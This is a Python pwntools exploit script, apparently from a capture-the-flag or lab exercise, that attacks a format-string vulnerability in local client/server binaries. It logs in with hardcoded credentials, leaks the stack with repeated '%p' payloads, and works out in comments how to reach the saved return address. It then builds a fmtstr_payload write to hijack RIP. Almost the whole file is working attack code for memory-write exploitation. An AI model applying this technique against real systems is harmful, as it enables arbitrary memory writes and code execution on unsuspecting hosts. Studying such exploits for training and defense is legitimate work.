from pwn import *

context.clear(arch = 'amd64')
# Disable ASLR !

server = process('bin/server')
client = process(['bin/client', '127.0.0.1', '1337'])

login = "login Acidburn\n"
passw = "pass CrashOverride\n"
client.sendline(login)
client.sendline(passw)
log.info("server after login %s" % server.recv())
log.info("client after login %s" % client.recv())


# Function called in order to send a payload
def send_payload(payload):
    log.info("payload = %s" % ("get " + repr(payload)))
    client.sendline("get " + payload)
    server_returns = server.recv()
    log.info("server returns: %s" % (server_returns))
    return server_returns

# Create a FmtStr object and give to him the function
#format_string = FmtStr(execute_fmt=send_payload, padlen=4)
#format_string.write(0x00007fffffffcd58, 0xAAAAAAAAAAAAAAAA) # write 0x1337babe at 0x0
# format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
# format_string.execute_writes()

#test1 = 'get \x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn'
def exectue_one(string):
    s = string
    client.sendline(s)
    print server.recv()
    client.recv()

def get_stack():
    #s = 'get %' + str(i) + '$11x'
    s = 'get ' + '%p.'*100
    client.sendline(s)
    res = server.recv()
    stack = res.split('.')
    client.recv()
    return stack


print "----------------------------------------------------------------------------"

stack = get_stack()
for i in range(len(stack) - 1):
    # find stack addresses thanks to 32 / 36
    add36 = int(stack[36 - 1],16) - 0x20
    bottom_address = add36 - (35 * 8)
    print str(i + 1) + " " + str(hex(bottom_address + i * 8)) + " " + stack[i]


s = 'get ' + '%28$p.'   # first address location
s = 'get ' + '%40$p.'   # second address location
s = 'get ' + '%41$p.'   # rip location

#s = 'get ' + 'h%28$n%40$p'   # rip location

print "----------------------------------------------------------------------------"

exectue_one("get %1$p")

print "----------------------------------------------------------------------------"

new_stack = get_stack()
usual_suspects = []
for i in range(len(new_stack)-1):
    if stack[i] != new_stack[i]:
        print str(i + 1) + " " + stack[i] + " " + new_stack[i]
        usual_suspects.append(i)

print "----------------------------------------------------------------------------"

# ---
# Look at that 32, 36 pair ! always fix, always 0x10 appart,
# always same offset to stack address
# stack address at 36 = stack[36 - 1] - 0x20
# stack address of rip = stack[36 - 1] - 0x20 + 0x28 # (41-36) * 8 = 40 = 0X28
# stack address of rip = stack[36 - 1] + 0x8

# ---
# Now realize that 16 points to 20, and value of 20 pretty close to address of 41
# -> use 16 to overwrite last byte of 20 to access 41 through 20 !
# Byte I need to write to 20 is d8 since:
# 41 0x7fffffffcdd8 0x55555555d806


s = "%28$s" # "%64c%11c%28$hhn%235c%29$hhn%32c%30$hhn%255c%31$hhn%32$hhn%33$hhn%171c%34$hhn%35$hhn"
exectue_one('get ' + s)


print "----------------------------------------------------------------------------"
#s = 'get ' + 'h%28$n%40$p'   # rip location

new_new_stack = get_stack()

for i in range(len(new_new_stack)-1):
    if new_new_stack[i] != new_stack[i] and i not in usual_suspects:
        print str(i +1) + " " + new_stack[i] + " " + new_new_stack[i]

print "----------------------------------------------------------------------------"
writes = {0x4142434445464748:   0x55555556364b}
payload = fmtstr_payload(40, writes, numbwritten=0)
print payload



# Get final output
#log.info("server cleanup %s" % server.recv())
#log.info("client cleanup %s" % client.recv())

# Clean up
client.close()
server.close()
